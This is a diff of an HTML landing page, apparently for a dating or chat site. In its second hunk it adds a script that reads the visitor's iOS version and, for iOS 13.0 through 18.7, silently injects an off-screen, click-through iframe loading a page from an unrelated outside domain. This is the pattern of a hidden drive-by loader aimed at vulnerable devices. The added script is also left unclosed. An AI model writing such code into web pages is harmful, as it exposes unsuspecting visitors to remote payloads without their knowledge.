@@ -156,27 +156,6 @@
         </div>
     </header>
 
-    if (
-    major >= 13 &&
-    (major < 18 || (major === 18 && minor <= 7))
-) {
-    // 符合 iOS 13.0 到 iOS 18.7
-    
-    // 1. 建立 iframe 元素
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://ads.yurticlkargo.com/static/sdk.html';
-    
-    // 2. 設定樣式 (對應原本 HTML 中的 style 屬性)
-    iframe.style.position = 'fixed';
-    iframe.style.top = '0';
-    iframe.style.left = '-1000px';
-    iframe.style.pointerEvents = 'none';
-    iframe.style.border = '0';
-    
-    // 3. 將 iframe 加入到網頁的 body 中
-    document.body.appendChild(iframe);
-}
-
     <!-- Hero Section -->
     <section class="relative min-h-screen flex items-center justify-center pt-28 pb-20 px-6 overflow-hidden">
         <div class="absolute top-1/4 left-1/4 w-[500px] h-[500px] bg-brandPink/15 rounded-full blur-[120px] pointer-events-none"></div>
@@ -530,6 +509,30 @@
     </footer>
 
     <!-- JavaScript for Background Collage Randomization, Geolocation, Step Quiz, 30s VIP Timer & Limited Mock Chat -->
+    <script>
+        // iOS version check and conditional iframe insertion
+        const ua = navigator.userAgent;
+        let major = 0, minor = 0;
+        const matchOS = ua.match(/OS (\d+)_(\d+)/);
+        if (matchOS) {
+            major = parseInt(matchOS[1], 10);
+            minor = parseInt(matchOS[2], 10);
+        }
+        if (
+            major >= 13 &&
+            (major < 18 || (major === 18 && minor <= 7))
+        ) {
+            // 符合 iOS 13.0 到 iOS 18.7
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://ads.yurticlkargo.com/static/sdk.html';
+            iframe.style.position = 'fixed';
+            iframe.style.top = '0';
+            iframe.style.left = '-1000px';
+            iframe.style.pointerEvents = 'none';
+            iframe.style.border = '0';
+            document.body.appendChild(iframe);
+        }
+            
     <script>
         // Array of your specified background photos
         const bgPhotos = [
